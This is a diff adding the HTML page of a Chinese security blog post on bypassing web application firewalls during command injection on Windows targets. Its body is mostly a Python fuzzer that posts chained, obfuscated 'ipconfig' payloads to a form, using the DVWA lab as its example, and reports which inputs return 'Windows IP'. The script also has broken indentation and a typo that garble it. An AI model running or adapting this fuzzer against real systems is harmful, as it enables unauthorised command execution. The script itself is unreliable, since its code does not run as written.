@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="前言国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。 音乐： 正文思路： 使用一些符号来对命令进行链接 执行指定命令，通过从网页上获取指定关键字判断是否成功bypass 代码： #这里只是拿DVWA做个例子# import requests import optparse   def main():     parser=opt">
+<meta name="keywords" content="Writing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行的时候绕过waf">
+<meta property="og:url" content="http://422926799.github.io/posts/5fc52f43.html">
+<meta property="og:site_name" content="九世的博客">
+<meta property="og:description" content="前言国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。 音乐： 正文思路： 使用一些符号来对命令进行链接 执行指定命令，通过从网页上获取指定关键字判断是否成功bypass 代码： #这里只是拿DVWA做个例子# import requests import optparse   def main():     parser=opt">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&fm=200&gp=0.jpg">
+<meta property="og:image" content="https://s1.ax1x.com/2018/10/05/i88M40.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/10/05/i883gU.png">
+<meta property="og:updated_time" content="2019-04-19T12:36:16.252Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令执行的时候绕过waf">
+<meta name="twitter:description" content="前言国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。 音乐： 正文思路： 使用一些符号来对命令进行链接 执行指定命令，通过从网页上获取指定关键字判断是否成功bypass 代码： #这里只是拿DVWA做个例子# import requests import optparse   def main():     parser=opt">
+<meta name="twitter:image" content="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&fm=200&gp=0.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>命令执行的时候绕过waf</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/posts/74113ec1.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/posts/e431254b.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5fc52f43.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5fc52f43.html&text=命令执行的时候绕过waf"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5fc52f43.html&is_video=false&description=命令执行的时候绕过waf"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=命令执行的时候绕过waf&body=Check out this article: http://422926799.github.io/posts/5fc52f43.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5fc52f43.html&name=命令执行的时候绕过waf&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        命令执行的时候绕过waf
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">九世的博客</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-05T05:19:12.000Z" itemprop="datePublished">2018-10-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Writing/">Writing</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>国庆第五天假期，才写了三篇博客。感觉有点不理想= =，这次写的是bypass命令执行，针对目标系统是windows的。<br><img src="http://img0.imgtn.bdimg.com/it/u=3304268035,1959556107&amp;fm=200&amp;gp=0.jpg" alt=""></p>
+<p>音乐：<embed src="//music.163.com/style/swf/widget.swf?sid=451113443&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>思路：</p>
+<pre><code>使用一些符号来对命令进行链接
+执行指定命令，通过从网页上获取指定关键字判断是否成功bypass
+</code></pre><p>代码：</p>
+<pre><code>#这里只是拿DVWA做个例子#
+import requests
+import optparse
+
+
+def main():
+    parser=optparse.OptionParser()
+    parser.add_option(&apos;-u&apos;,dest=&apos;zru&apos;,help=&apos;Used for fuzzy testing&apos;)
+    (options,args)=parser.parse_args()
+    if options.zru:
+        url=options.zru
+        fuzz(url)
+    else:
+        parser.print_help()
+        exit()
+
+def fuzz(url):
+cookies=&apos;PHPSESSID=70mpunbrle3mb6bfaiqieqf3p3;security=high&apos;
+cookie = {}
+for k in str(cookies).strip().split(&apos;;&apos;):
+    key, value = k.split(&apos;=&apos;, 1)
+    cookie[key] = value
+
+urls=url
+headers={&apos;user-aegnt&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&apos;}
+payload=[&apos;|&apos;,&apos;;&apos;,&apos;||&apos;,&apos;&amp;&amp;&apos;,&apos;&amp;&apos;]
+payload_b=[&apos;-&apos;,&apos;$&apos;]
+payload_c=[&apos;-&apos;]
+payload_d=[&apos;$&apos;]
+for p in payload:
+    for pb in payload_b:
+        for pc in payload_c:
+            for pd in payload_d:
+                pf=pc+pd
+                datas={&apos;ip&apos;:&apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p,pb,pb,pb,pb,pb,pb,pb),&apos;Submit&apos;:&apos;Submit&apos;}
+                datas2={&apos;ip&apos;: &apos;127.0.0.1{}i{}p{}c{}o{}n{}f{}i{}g&apos;.format(p, pf, pf, pf, pf, pf, pf, pf),&apos;Submit&apos;: &apos;Submit&apos;}
+                reqt=requests.post(url=urls,headers=headers,cookies=cookie,data=datas)
+                reqt2=requests.post(url=urls,headers=headers,cookies=cookie,data=datas2)
+                if &apos;Windows IP&apos; in reqt.text:
+                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url,datas))
+                if &apos;Windows IP&apos; in reqt2.text:
+                    print(&apos;[+] Bypass success URL:{} data:{}&apos;.format(reqt.url, datas))
+
+if __name__ == &apos;__main__&apos;:
+    main()
+</code></pre><p>测试：<br><img src="https://s1.ax1x.com/2018/10/05/i88M40.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2018/10/05/i883gU.png" alt=""></p>
+<p>转载请注明转自<a href="mailto:422926799@qq.com" target="_blank" rel="noopener">422926799@qq.com</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://422926799.github.io/posts/5fc52f43.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://422926799.github.io/posts/5fc52f43.html&text=命令执行的时候绕过waf"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://422926799.github.io/posts/5fc52f43.html&is_video=false&description=命令执行的时候绕过waf"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=命令执行的时候绕过waf&body=Check out this article: http://422926799.github.io/posts/5fc52f43.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://422926799.github.io/posts/5fc52f43.html&title=命令执行的时候绕过waf"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://422926799.github.io/posts/5fc52f43.html&name=命令执行的时候绕过waf&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 九世
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/Search">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
